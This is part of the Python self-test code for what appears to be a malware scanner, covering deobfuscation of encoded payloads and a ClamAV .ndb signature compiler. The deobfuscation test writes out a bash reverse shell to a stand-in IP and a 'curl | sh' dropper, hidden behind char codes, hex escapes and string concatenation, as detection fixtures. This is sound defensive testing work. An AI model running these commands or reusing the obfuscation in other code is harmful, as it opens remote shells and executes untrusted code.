        fails += _selftest_ndb(d)
        fails += _selftest_obf(d)
    return fails


def _selftest_obf(d: str) -> list[str]:
    """Inline deobfuscation: payloads hidden behind char-codes / escapes / concat
    must be decoded and caught by the underlying rules."""
    fails: list[str] = []
    rs = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
    codes = ",".join(str(ord(c)) for c in rs)
    esc = "".join("\\x%02x" % ord(c) for c in rs)
    chrj = "+".join("chr(%d)" % ord(c) for c in "import os;os.system('curl http://e/x|sh')")
    cases = {
        "charcode.js": f"eval(String.fromCharCode({codes}))\n",
        "numarray.js": f"var a=[{codes}];eval(a.map(c=>String.fromCharCode(c)).join(''))\n",
        "hexesc.js": f'eval("{esc}")\n',
        "chrjoin.py": f"exec({chrj})\n",
        "concat.js": "f='ev'+'al';this[f]('x /dev/tcp/9.9.9.9/1');\n",
    }
    sub = os.path.join(d, "obf")
    os.makedirs(sub, exist_ok=True)
    for fn, body in cases.items():
        with open(os.path.join(sub, fn), "w", encoding="utf-8") as fh:
            fh.write(body)
    ids = {f.rule.rid for f in Scanner().scan(sub)}
    # each technique must surface the decoded payload (reverse shell or dropper)
    if "RSHELL-001" not in ids:
        fails.append(f"deobf failed to expose reverse shell: {sorted(ids)}")
    if "DROP-001" not in ids:
        fails.append(f"deobf failed to expose curl|sh dropper: {sorted(ids)}")
    if "HEUR-DECODED" not in ids:
        fails.append("deobf did not mark HEUR-DECODED")
    for want in ("OBF-007", "OBF-008"):
        if want not in ids:
            fails.append(f"deobf primitive rule {want} missing: {sorted(ids)}")
    return fails


def _selftest_ndb(d: str) -> list[str]:
    """ClamAV .ndb compiler + Aho-Corasick prefilter + offset/type semantics."""
    global _NDB_AC, _NDB_SIGS, _NDB_STATS
    fails: list[str] = []
    saved = (_NDB_AC, _NDB_SIGS, _NDB_STATS)
    # body grammar coverage: literal, ?? any, nibble 4?, {2} gap, (aa|bb) alt
    ndb = (
        "Test.Literal:0:*:6d616c7761726559455331\n"          # "malwareYES1"
        "Test.AnyByte:0:*:6d616c77??617265\n"                 # "malw"<any>"are"
        "Test.Nibble:0:*:6d616c7761724?65\n"                  # "malwar"[40-4f]"e"
        "Test.Gap:0:*:6d616c{2}7761726533\n"                  # "mal"..{2}.."ware3"
        "Test.Alt:0:*:6d616c77617265(31|32)\n"               # "malware"("1"|"2")
        "Test.PEonly:1:*:6d616c7761726550\n"                  # "malwareP", PE files only
        "Test.AbsOff:0:5:48454c4c4f\n"                        # "HELLO" at offset 5
        "Test.Eof:0:EOF-6:544845454e44\n"                     # "THEEND" at EOF-6
        "Bad.Negation:0:*:!(aabb)ccdd\n"                      # unsupported → skipped
        "Bad.Short:0:*:6d61\n"                                # 2-byte anchor → skipped
    )
    p = os.path.join(d, "patterns.ndb")
    with open(p, "w", encoding="utf-8") as fh:
        fh.write(ndb)
    load_ndb(p)
    if _NDB_AC is None:
        fails.append("ndb compile produced no matcher")
        _NDB_AC, _NDB_SIGS, _NDB_STATS = saved
        return fails
    if _NDB_STATS.get("skipped_syntax", 0) < 1 or _NDB_STATS.get("skipped_short", 0) < 1:
        fails.append(f"ndb skip-accounting wrong: {_NDB_STATS}")

    def hit(raw: bytes) -> set:
        return {f.snippet.split(": ", 1)[1] for f in _ndb_scan("t", raw)}

    cases = [
        (b"....malwareYES1....", "Test.Literal", True),
        (b"....malwZare....", "Test.AnyByte", True),
        (b"....malwarHe....", "Test.Nibble", True),       # 'H'=0x48 in 0x40-0x4f
        (b"....malZZware3....", "Test.Gap", True),         # mal + 2 any + ware3
        (b"....malware1....", "Test.Alt", True),           # malware + (1|2)
        (b"ZZZZZHELLO rest", "Test.AbsOff", True),         # HELLO at offset 5
        (b"abcdTHEEND", "Test.Eof", True),                 # THEEND at EOF-6
        (b"nothing here at all", "Test.Literal", False),
    ]
    for raw, want, expect in cases:
        got = want in hit(raw)
        if got != expect:
            fails.append(f"ndb {want}: got={got} want={expect}")
    # target-type filter: PE-only sig must NOT fire on a plain-text buffer
    if "Test.PEonly" in hit(b"....malwareP plain text...."):
        fails.append("ndb target-type filter failed (PE sig hit text)")
    # …but fires on a PE (MZ) buffer
    if "Test.PEonly" not in hit(b"MZ\x00\x00....malwareP...."):
        fails.append("ndb PE sig missed a PE file")
    _NDB_AC, _NDB_SIGS, _NDB_STATS = saved
    return fails


